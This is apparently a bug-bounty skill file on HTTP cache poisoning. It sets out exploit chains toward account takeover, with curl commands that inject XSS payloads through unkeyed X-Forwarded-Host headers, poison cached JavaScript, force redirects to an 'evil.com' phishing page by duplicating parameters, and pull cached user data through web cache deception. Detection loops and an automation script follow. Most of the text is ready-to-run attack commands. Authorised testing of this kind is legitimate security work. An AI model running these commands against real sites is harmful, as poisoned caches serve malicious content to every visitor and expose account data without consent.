---
name: hunt-cache-poisoning
description: HTTP cache poisoning — unkeyed headers, fat GET, file extension confusion, web cache deception, exploit chains, and automation.
---

# HTTP CACHE POISONING

Force cache to serve malicious response to ALL users. Reference: PortSwigger/Lewis Lamb research.

## REAL-WORLD BOUNTIES

| Target | Vector | Payout |
|--------|--------|--------|
| HackerOne programs | X-Forwarded-Host unkeyed → XSS | $3,500–$15,000 |
| Private program | Fat GET via Content-Length mismatch | $10,000 |
| GitLab | Path confusion + cache headers | $5,000 |
| Major SaaS | X-Original-URL unkeyed → admin panel | $8,000 |
| E-commerce | Vary header misconfiguration → price manipulation | $12,000 |
| Cloudflare edge | cf-ray variation → stale content | $1,500 |

## EXPLOIT CHAINS

### Chain 1: Unkeyed Header → XSS → Account Takeover
```bash
# Identify reflection
curl -sD- -H "X-Forwarded-Host: evil.com" "https://target.com/" | grep "evil.com"
# Confirm caching (Age header)
curl -sD- "https://target.com/" | grep -iE "Age:|X-Cache|x-cache"
# Inject XSS
curl -H "X-Forwarded-Host: a.'-alert(1)-'b" "https://target.com/"
# Verify poison
curl -s "https://target.com/" | grep "alert(1)"
```

### Chain 2: Parameter Pollution → Poison → Takeover
```bash
# Find redirect param
curl -sD- "https://target.com/?redirect=https://target.com" | grep -i "location"
# Duplicate param with evil value
curl -sD- "https://target.com/?redirect=https://target.com&redirect=https://evil.com/phish" | grep -i "location"
```

### Chain 3: File Extension Confusion → JS Poisoning
```bash
# Non-existent JS returns HTML
curl -sD- "https://target.com/nonexistent.js" | head -20
# Inject XSS
curl -H "X-Forwarded-Host: a';alert(1)//" "https://target.com/nonexistent.js"
# Verify
curl -s "https://target.com/nonexistent.js" | grep "alert(1)"
```

### Chain 4: Web Cache Deception → Account Takeover
```bash
# Test deceptive path
curl -sD- "https://target.com/profile/nonexistent.css" | grep -iE "Age:|X-Cache"
# Check if user content is cached
curl -s "https://target.com/profile/nonexistent.css" | grep -i "username\|email\|csrf"
```

## DETECTION METHODOLOGY

### Phase 1: Cache Infrastructure
```bash
curl -sD- "https://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-varnish|fastly|cloudfront"
```

### Phase 2: Unkeyed Header Scan
```bash
for h in X-Forwarded-Host X-Forwarded-For X-Original-URL X-Rewrite-URL X-Host X-Real-IP X-Client-IP True-Client-IP; do
  PAYLOAD="poison-$(date +%s)"
  curl -sD- -H "$h: $PAYLOAD" "https://target.com/" > /dev/null
  RESP=$(curl -s "https://target.com/" 2>/dev/null | grep -c "$PAYLOAD")
  [ "$RESP" -gt 0 ] && echo "VULN: $h is unkeyed"
done
```

### Phase 3: File Extension Confusion
```bash
for ext in .js .css .png .txt .xml .svg; do
  CT=$(curl -sD- "https://target.com/nonexistent${ext}" | grep -i "content-type" | head -1)
  echo "$CT" | grep -qi "text/html" && echo "CONFUSION: ${ext} returns HTML"
done
```

### Phase 4: Parameter Pollution
```bash
for param in url redirect next return dest continue; do
  RESP1=$(curl -sD- "https://target.com/?${param}=https://example.com" | grep -i "location" | head -1)
  RESP2=$(curl -sD- "https://target.com/?${param}=https://example.com&${param}=https://evil.com" | grep -i "location" | head -1)
  [ "$RESP1" != "$RESP2" ] && echo "VULN: $param → collision"
done
```

### Phase 5: Timing Analysis
```bash
curl -sD- "https://target.com/" | grep -i "age:\|cache-control:\|expires:"
```

## WEB CACHE DECEPTION TEST
```bash
# Test paths that commonly get cached
for path in /profile/style.css /settings/config.js /dashboard/image.png /account/robots.txt; do
  AGE=$(curl -sD- "https://target.com${path}" | grep -i "^age:" | awk '{print $2}' | tr -d '\r')
  [ -n "$AGE" ] && [ "$AGE" -gt 0 ] && echo "CACHED: ${path} (Age: ${AGE}s)"
done
```

## AUTOMATION SCRIPT
```bash
#!/bin/bash
TARGET="$1"; mkdir -p cache-scan
for h in X-Forwarded-Host X-Forwarded-For X-Original-URL X-Rewrite-URL X-Host X-Real-IP; do
  P="p$(date +%s)"; curl -sD- -H "$h: $P" "$TARGET" >/dev/null; curl -s "$TARGET" | grep -q "$P" && echo "VULN: $h"
done
for ext in .js .css .png .txt .xml; do
  curl -sD- "${TARGET}/x${ext}" | grep -qi "content-type: text/html" && echo "CONFUSION: ${ext}"
done
for param in url redirect next return dest; do
  curl -sD- "${TARGET}/?${param}=https://a.com&${param}=https://b.com" | grep -qi "location.*b.com" && echo "POLLUTION: $param"
done
```

## QUICK REFERENCE
```
Headers:     X-Forwarded-Host, X-Forwarded-For, X-Original-URL, X-Rewrite-URL
Extensions:  .js, .css, .png, .txt, .xml, .svg
Indicators:  Age, X-Cache, CF-Cache-Status, X-Varnish, Via
Deception:   /path/style.css, /path/config.js, /path/robots.txt
Params:      url, redirect, next, return, dest, continue
```
